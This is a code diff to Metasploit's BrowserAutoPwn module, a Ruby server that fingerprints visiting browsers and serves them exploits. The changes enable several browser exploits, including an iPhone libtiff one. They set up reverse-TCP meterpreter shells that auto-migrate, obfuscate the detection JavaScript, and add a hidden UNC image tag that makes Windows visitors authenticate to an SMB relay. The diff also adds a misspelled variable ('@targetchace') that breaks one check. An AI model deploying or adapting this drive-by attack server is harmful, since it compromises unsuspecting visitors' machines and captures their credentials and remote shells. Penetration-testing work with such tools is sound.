@@ -30,8 +30,8 @@ class Auxiliary::Server::BrowserAutoPwn < Msf::Auxiliary
 				},
 			'Author'      => 
 				[
-					'egypt <egypt[at]nmt.edu>',  # initial concept, integration and extension of Jerome's os_detect.js
-					'Jerome Athias'              # advanced Windows OS detection in javascript
+					'egypt <egypt[at]metasploit.com>',  # initial concept, integration and extension of Jerome's os_detect.js
+					'Jerome Athias'                     # advanced Windows OS detection in javascript
 				],
 			'License'     => BSD_LICENSE,
 			'Actions'     =>
@@ -63,8 +63,9 @@ class Auxiliary::Server::BrowserAutoPwn < Msf::Auxiliary
 		@exploits[name] = framework.modules.create(name)
 		@exploits[name].datastore['SRVPORT'] = datastore['SRVPORT']
 
-		# for testing, set the exploit uri to the name of the exploit so it's
-		# easy to tell what is happening from the browser
+		# For testing, set the exploit uri to the name of the exploit so it's
+		# easy to tell what is happening from the browser.
+		# XXX: Comment this out for release
 		@exploits[name].datastore['URIPATH'] = name  
 
 		@exploits[name].datastore['LPORT']   = @lport
@@ -108,9 +109,11 @@ class Auxiliary::Server::BrowserAutoPwn < Msf::Auxiliary
 
 		# works on iPhone 
 		# does not require javascript
-		#init_exploit('exploit/osx/armle/safari_libtiff')
+		init_exploit('exploit/osx/armle/safari_libtiff')
 
+		# untested
 		#init_exploit('exploit/osx/browser/software_update')
+		# untested
 		#init_exploit('exploit/windows/browser/ani_loadimage_chunksize')
 
 		# does not require javascript
@@ -120,7 +123,7 @@ class Auxiliary::Server::BrowserAutoPwn < Msf::Auxiliary
 		init_exploit('exploit/windows/browser/novelliprint_getdriversettings')
 
 		# Works on default IE 6
-		# Doesn't work on Windows 2000 IE 5.0
+		# Doesn't work on Windows 2000 SP0 IE 5.0
 		# I'm pretty sure keyframe works on everything this works on, but since
 		# this doesn't need javascript, try it anyway.
 		# does not require javascript
@@ -145,6 +148,9 @@ class Auxiliary::Server::BrowserAutoPwn < Msf::Auxiliary
 		# classid 88d969c5-f192-11d4-a65f-0040963251e5
 		init_exploit('exploit/windows/browser/ms06_071_xml_core')
 
+		# Pops up whatever client is registered for .pls files.  It's pretty
+		# obvious to the user when this exploit loads, so leave it out for now.
+		# does not require javascript
 		#init_exploit('exploit/windows/browser/winamp_playlist_unc')
 
 
@@ -157,6 +163,7 @@ class Auxiliary::Server::BrowserAutoPwn < Msf::Auxiliary
 		smbr_mod.datastore['LHOST']   = @lhost
 		smbr_mod.datastore['LPORT']   = (@lport += 1)
 		smbr_mod.datastore['SRVPORT'] = 139
+		smbr_mod.datastore['AutoRunScript'] = 'migrate'
 		smbr_mod.exploit_simple(
 			'LocalInput'     => self.user_input,
 			'LocalOutput'    => self.user_output,
@@ -169,6 +176,7 @@ class Auxiliary::Server::BrowserAutoPwn < Msf::Auxiliary
 		smbr_mod.datastore['LHOST']   = @lhost
 		smbr_mod.datastore['LPORT']   = (@lport += 1)
 		smbr_mod.datastore['SRVPORT'] = 445
+		smbr_mod.datastore['AutoRunScript'] = 'migrate'
 		smbr_mod.exploit_simple(
 			'LocalInput'     => self.user_input,
 			'LocalOutput'    => self.user_output,
@@ -176,7 +184,9 @@ class Auxiliary::Server::BrowserAutoPwn < Msf::Auxiliary
 			'Payload'        => 'windows/meterpreter/reverse_tcp',
 			'RunAsJob'       => true)
 			
-						
+		@myhost = datastore['SRVHOST']
+		@myport = datastore['SRVPORT']
+
 	end
 
 	def on_request_uri(cli, request) 
@@ -187,30 +197,30 @@ class Auxiliary::Server::BrowserAutoPwn < Msf::Auxiliary
 		@targetcache[cli.peerhost] ||= {}
 		@targetcache[cli.peerhost][:update] = Time.now.to_i
 
-		# Clean the cache 
+		##
+		# Clean the cache -- remove hosts that we haven't seen for more than 60
+		# seconds
+		##
 		rmq = []
 		@targetcache.each_key do |addr|
 			if (Time.now.to_i > @targetcache[addr][:update]+60)
 				rmq.push addr
 			end
 		end
-				
 		rmq.each {|addr| @targetcache.delete(addr) }
+		#--
 	
 		case request.uri
 			when %r{^#{datastore['URIPATH']}.*sessid=}: 
 				record_detection(cli, request)
 				send_not_found(cli)
-			when %r{^#{datastore['URIPATH']}\?}: 
 			when %r{^#{datastore['URIPATH']}$}: 
 				#
-				# This is the request for exploits.  At this point we should at
-				# least know whether javascript is enabled; if it is, we'll
-				# have browser name and version for IE and Firefox as well as
-				# OS version and Service Pack for Windows.  If our javascript
-				# detection failed to report back, try to get the same
-				# information from the User-Agent string which is less reliable
-				# because it may have been spoofed.
+				# This is the request for exploits.  At this point all we know
+				# about the target came from the useragent string which could
+				# have been spoofed, so let the javascript figure out which 
+				# exploits to run.  Record detection based on the useragent in  
+				# case javascript is disabled on the target.
 				#
 
 				record_detection(cli, request)
@@ -222,7 +232,7 @@ class Auxiliary::Server::BrowserAutoPwn < Msf::Auxiliary
 				
 				cli.send_response(response)
 			else
-				print_error("I don't know how to handle this request #{request.uri}, sending 404")
+				print_error("I don't know how to handle this request (#{request.uri}), sending 404")
 				send_not_found(cli)
 				return false
 		end
@@ -264,10 +274,6 @@ class Auxiliary::Server::BrowserAutoPwn < Msf::Auxiliary
 		}
 		hash_declaration = objects.map{ |k, v| "'#{k}', '#{v}'," }.join.chop
 
-
-		
-
-
 		js = <<-ENDJS
 
 			#{js_os_detect}
@@ -286,29 +292,36 @@ class Auxiliary::Server::BrowserAutoPwn < Msf::Auxiliary
 			}
 
 			function send_detection_report(detected_version) {
-				try { xml = new XMLHttpRequest(); }
+				// ten chars long and all uppercase so we can't possibly step
+				// on a real version string.
+				var cruft = "#{Rex::Text.rand_text_alpha_upper(10)}"; 
+				var encoded_detection;
+				try { xmlhr = new XMLHttpRequest(); }
 				catch(e) {
-					try { xml = new ActiveXObject("Microsoft.XMLHTTP"); }
+					try { xmlhr = new ActiveXObject("Microsoft.XMLHTTP"); }
 					catch(e) {
-						xml = new ActiveXObject("MSXML2.ServerXMLHTTP");
+						xmlhr = new ActiveXObject("MSXML2.ServerXMLHTTP");
 					}
 				}
-				if (! xml) {
+				if (! xmlhr) {
 					return(0);
 				}
-				var url = "asdf".replace("asdf", "");
-				url += detected_version.os_name + "asdf"; 
-				url += detected_version.os_flavor + "asdf"; 
-				url += detected_version.os_sp + "asdf"; 
-				url += detected_version.os_lang + "asdf"; 
-				url += detected_version.arch + "asdf"; 
-				url += detected_version.browser_name + "asdf"; 
-				url += detected_version.browser_version; 
-				url = url.replace(/asdf/g, ":");
-				url = Base64.encode(url);
-				document.write(url + "<br>");
-				xml.open("GET", document.location + "?sessid=" + url, false);
-				xml.send(null);
+				encoded_detection =  new String();
+				encoded_detection += detected_version.os_name + cruft; 
+				encoded_detection += detected_version.os_flavor + cruft; 
+				encoded_detection += detected_version.os_sp + cruft; 
+				encoded_detection += detected_version.os_lang + cruft; 
+				encoded_detection += detected_version.arch + cruft; 
+				encoded_detection += detected_version.browser_name + cruft; 
+				encoded_detection += detected_version.browser_version; 
+				while (-1 != encoded_detection.indexOf(cruft)) {
+					encoded_detection = encoded_detection.replace(cruft, ":");
+				}
+				document.write(encoded_detection + "<br>");
+				encoded_detection = Base64.encode(encoded_detection);
+				document.write(encoded_detection + "<br>");
+				xmlhr.open("GET", document.location + "?sessid=" + encoded_detection, false);
+				xmlhr.send(null);
 			}
 
 			function BodyOnLoad() {
@@ -316,7 +329,14 @@ class Auxiliary::Server::BrowserAutoPwn < Msf::Auxiliary
 				var body_elem = document.getElementById('body_id');
 				var detected_version = getVersion();
 
-				send_detection_report(detected_version);
+				try {
+					// This function doesn't seem to get created on old
+					// browsers (specifically, Firefox 1.0), so until I
+					// can puzzle out why, wrap it in a try block so the
+					// javascript parser doesn't crap out and die before
+					// any exploits get sent.
+					send_detection_report(detected_version);
+				} catch (e) {}
 
 				if ("#{HttpClients::IE}" == detected_version.browser_name) {
 					//document.write("This is IE<br />");
@@ -382,11 +402,11 @@ class Auxiliary::Server::BrowserAutoPwn < Msf::Auxiliary
 					}
 					// eventually this exploit will have an auto target and
 					// this check won't be necessary
-					if ("#{OperatingSystems::MAC_OSX}" == detected_version.os_name) {
+					//if ("#{OperatingSystems::MAC_OSX}" == detected_version.os_name) {
 						if (location.QueryInterface) {
 							sploit_frame += '#{build_iframe(@exploits['exploit/multi/browser/firefox_queryinterface'].get_resource)}';
 						}
-					}
+					//}
 				}
 				if (0 < sploit_frame.length) { 
 					//document.write("Conditions optimal, writing evil iframe(s) <br />"); 
@@ -396,63 +416,58 @@ class Auxiliary::Server::BrowserAutoPwn < Msf::Auxiliary
 			window.onload = BodyOnLoad
 		ENDJS
 		opts = {
+			# Strings obfuscation still needs more testing
+			'Strings' => true,
 			'Symbols' => {
 				'Variables' => [
 					'current_item', 'items',
 					'body_elem', 'body_id', 
 					'object_list', 'vuln_obj', 
 					'obj_elem', 'sploit_frame',
-					'written_frames',
-					'detected_version'
+					'cruft', 'written_frames',
+					'detected_version', 'xmlhr',
+					'encoded_detection'
 				],
 				'Methods'   => [
 					'Hash', 'BodyOnLoad', 
-					'send_detection_report', 'xml'
+					'send_detection_report'
 				]
-			},
-			'Strings' => true
+			}
 		}
 
 		js = ::Rex::Exploitation::ObfuscateJS.new(js, opts)
 		js.update_opts(js_os_detect.opts)
 		js.update_opts(js_base64.opts)
-		#js.obfuscate({'Strings'=>true})
+		js.obfuscate()
 
-		# Since ms03_020 works without javascript and we can guarantee with
-		# conditional comments that it won't eat resources in non-IE browsers,
-		# go ahead and send it with all responses in case our detection failed.
+		body  = "<body id=#{js.sym('body_id')}>"
+
+		# 
+		# These are non-javascript exploits, send them with all requests in
+		# case the ua is spoofed and js is turned off
 		#
+		body << "<!--[if lt IE 7]>"
 		# commented this out so i can test other exploits
-		body = <<-ENDHTML
-			<body id="#{js.sym('body_id')}">
-			<!--
-			<!--[if lt IE 7]>
-			#{build_iframe(@exploits['exploit/windows/browser/ms03_020_ie_objecttype'].get_resource)}
-			<![endif]-->
-		ENDHTML
+		# XXX uncomment for release
+		#body << build_iframe(@exploits['exploit/windows/browser/ms03_020_ie_objecttype'].get_resource)
+		body << "<![endif]-->"
 
-		response.body = ' <html> <head> <title> Loading </title> '
-		response.body << ' <script language="javascript" type="text/javascript">'
-		response.body << "<!--\n" + js + ' //-->'
+		# image for smb_relay 
+		share_name = Rex::Text.rand_text_alpha(rand(10) + 5) 
+		img_name = Rex::Text.rand_text_alpha(rand(10) + 5) + ".jpg"
+		body << %Q{
+			<img src="\\\\#{@lhost}\\#{share_name}\\#{img_name}" style="visibility:hidden" height="0" width="0" border="0" />
+		}
+		body << build_iframe(@exploits['exploit/windows/browser/apple_quicktime_rtsp'].get_resource)
+		body << build_iframe(@exploits['exploit/osx/armle/safari_libtiff'].get_resource)
+
+
+		response.body = ' <html > <head > <title > Loading </title> '
+		response.body << ' <script language="javascript" type="text/javascript" >'
+		response.body << " <!--\n" + js + ' //-->'
 		response.body << ' </script> </head> ' + body 
 
-		# At this point in time all we have is the user agent detection.
-		# Consider moving the non-javascript exploits into the main body
-		# regardless of detected OS in case the user agent was spoofed.
-		case (get_target_os(cli))
-			when OperatingSystems::WINDOWS
-				# add the img tag for smb_relay
-				response.body << %Q{
-					<img src="\\\\#{@lhost}\\public\\#{Rex::Text.rand_text_alpha(15)}.jpg" style="visibility:hidden" height="0" width="0" border="0" />
-					#{build_iframe(@exploits['exploit/windows/browser/apple_quicktime_rtsp'].get_resource)} 
-				}
-			when OperatingSystems::MAC_OSX
-				if ('armle' == get_target_arch(cli))
-					# Then it's an iPhone
-					response.body << build_iframe(@exploits['exploit/osx/armle/safari_libtiff'].get_resource)
-				end
-		end
-		response.body << "</body></html>"
+		response.body << " </body> </html> "
 
 		return response
 	end
@@ -546,28 +561,35 @@ class Auxiliary::Server::BrowserAutoPwn < Msf::Auxiliary
 		end
 		arch ||= ARCH_X86
 
-		@targetcache[cli.peerhost][:os_name]   = os_name
-		@targetcache[cli.peerhost][:os_flavor] = os_flavor
-		@targetcache[cli.peerhost][:os_sp]     = os_sp
-		@targetcache[cli.peerhost][:os_lang]   = os_lang
-		@targetcache[cli.peerhost][:arch]      = arch
-		@targetcache[cli.peerhost][:ua_name]   = ua_name
-		@targetcache[cli.peerhost][:ua_vers]   = ua_vers
-
 		report_host(
 			:host       => cli.peerhost,
 			:os_name    => os_name,
 			:os_flavor  => os_flavor, 
-			:os_lang    => os_lang, 
 			:os_sp      => os_sp, 
-			:arch       => arch
+			:os_lang    => os_lang, 
+			:arch       => arch,
+			:ua_name    => ua_name,
+			:ua_vers    => ua_vers
 		)
 		report_note(
 			:host       => cli.peerhost,
 			:type       => 'http_request',
-			:data       => "UA:#{ua_name} UA_VER:#{ua_vers}"
+			:data       => "#{@myhost}:#{@myport} #{request.method} #{request.resource} #{os_name} #{ua_name} #{ua_vers}"
 		)
 
+	end
+
+	def report_host(opts)
+
+		@targetcache[opts[:host]][:os_name]   = opts[:os_name]
+		@targetcache[opts[:host]][:os_flavor] = opts[:os_flavor]
+		@targetcache[opts[:host]][:os_sp]     = opts[:os_sp]
+		@targetcache[opts[:host]][:os_lang]   = opts[:os_lang]
+		@targetcache[opts[:host]][:arch]      = opts[:arch]
+		@targetcache[opts[:host]][:ua_name]   = opts[:ua_name]
+		@targetcache[opts[:host]][:ua_vers]   = opts[:ua_vers]
+
+		super(opts)
 	end
 	
 	# This or something like it should probably be added upstream in Msf::Exploit::Remote
@@ -575,7 +597,7 @@ class Auxiliary::Server::BrowserAutoPwn < Msf::Auxiliary
 		if framework.db.active
 			host = framework.db.get_host(nil, cli.peerhost)
 			res = host.os_name
-		elsif @targetcache[cli.peerhost][:os_name]
+		elsif @targetcache[cli.peerhost] and @targetchace[cli.peerhost][:os_name]
 			res = @targetcache[cli.peerhost][:os_name]
 		else
 			res = OperatingSystems::UNKNOWN
